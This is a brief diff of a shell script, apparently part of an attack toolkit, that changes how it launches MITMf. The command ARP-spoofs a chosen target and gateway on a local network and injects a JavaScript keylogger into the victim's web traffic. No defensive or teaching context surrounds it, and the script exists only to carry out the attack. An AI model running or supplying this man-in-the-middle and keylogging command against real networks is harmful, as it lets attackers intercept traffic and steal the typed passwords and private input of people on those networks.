@@ -6,4 +6,4 @@ echo
 read -p "Enter your Interface: " interface
 echo
 echo "[*]Your attack will be start wait a minute ....."
-./sniffer/mitmf.py --arp --spoof -i "$interface" --gateway "$gateway" --target "$target" --jskeylogger 
+python /etc/SEF/tools/sniffer/mitmf.py --arp --spoof -i "$interface" --gateway "$gateway" --target "$target" --jskeylogger 
